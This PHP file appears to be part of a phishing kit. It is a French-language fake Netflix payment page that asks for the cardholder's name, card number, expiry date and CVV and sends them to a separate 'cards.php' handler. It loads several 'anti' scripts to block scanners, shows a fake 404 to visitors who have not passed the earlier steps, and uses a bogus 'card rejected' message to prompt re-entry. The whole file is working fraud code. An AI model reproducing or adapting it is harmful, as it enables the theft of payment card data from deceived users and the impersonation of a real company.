<?php

session_start();
include('../ab.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');

if($_SESSION['billinged'] == true)
{




?>

<html><head><style>

    @import url('//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
 
.isa_error {
    color: #D8000C;
    background-color: #FFD2D2;
}
.my-notify-error:before {
    content:'\f057';
}
.my-notify-info {
    color: #00529B;
    background-color: #BDE5F8;
}
.my-notify-success {
    color: #4F8A10;
    background-color: #DFF2BF;
}
.my-notify-warning {
    color: #9F6000;
    background-color: #FEEFB3;
}
.my-notify-error {
    color: #D8000C;
    background-color: #FFD2D2;
}
    </style>


    <meta charset="utf-8">
    <link href="../img/logo.gif" rel="shortcut icon">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>Netflix</title> 
        <link href="../css/estilos.css" rel="stylesheet">
    </head>
    

    <body>
        <div class="wrapper">
            <header class="header">
                <div class="header-inner">
                    <div class="logo">
                        <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg>     
                    </div>
                </div>
            </header>
            <div class="login-box">
                <div class="login-box-inner">
                    <h1>Informations de paiement</h1>



<center><img src="../img/secured.png" style="width: 200px;"></center>
<br>
<?php
                    if(strpos($_SERVER['REQUEST_URI'], "error=empty"))
                    {
                        echo'<h1 style="font-size: 15px;color: #8B0000"> <i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Veuillez remplir tout les champs </h1> <br>';
                    }

                     if(strpos($_SERVER['REQUEST_URI'], "error=invalidcard"))
                    {
                        echo'<h1 style="font-size: 15px;color: #8B0000"> <i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Carte rejetée par la banque emettrice </h1> <br>';
                    }

                    ?>

                    

                    <form action="../actions/cards.php" method="post"> 
                        <div class="form-group">
                            <div class="form-group">
                            <input type="text" name="nomcc" value="<?php echo $_SESSION['nom']; ?>" placeholder="Nom sur la carte">
                        </div><div class="form-group">
                            <input type="text" name="ccnum" minlength="16" maxlength="16" placeholder="Numéro de carte" >
                        </div>
                        <div class="form-group">
                            <input type="text" name="ccexp" minlength="5" maxlength="5" placeholder="Date d'expiration (MM/AA)" onkeyup="formatString(event);">
                        </div><div class="form-group">
                            <input type="password" name="cvv" minlength="3" maxlength="4" placeholder="CVV (Code de sécurité)">
                        </div></div>
                        
                        <div class="form-group">
                            <button type="submit" name="cardsub">Continuer</button>
                        </div>
                        
                        
                    </form>
                </div>
            </div>
            
            <script>
function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}

</script>


<br>
<br><br>
<br>
<br>
<br>

<br>

<div class="footer">
                <div class="question">
                    <h4><a href="tel:0800-761-4631" target="_blank">Des questions ? Appelez le 0855-220-519</a></h4>
                    <span><a href="https://help.netflix.com/legal/giftterms" target="_blank">Préférences de cookies</a></span>
                    <span><a href="https://help.netflix.com/legal/termsofuse" target="_blank">Conditions d'utilisation</a></span>
                    <span><a href="https://help.netflix.com/legal/privacy" target="_blank">Confidentialité</a></span>
                </div>
            </div>
        </div>
    






</body></html>

<?php
}
else{
	die("HTTPS 404 NOT FOUND");
}


?>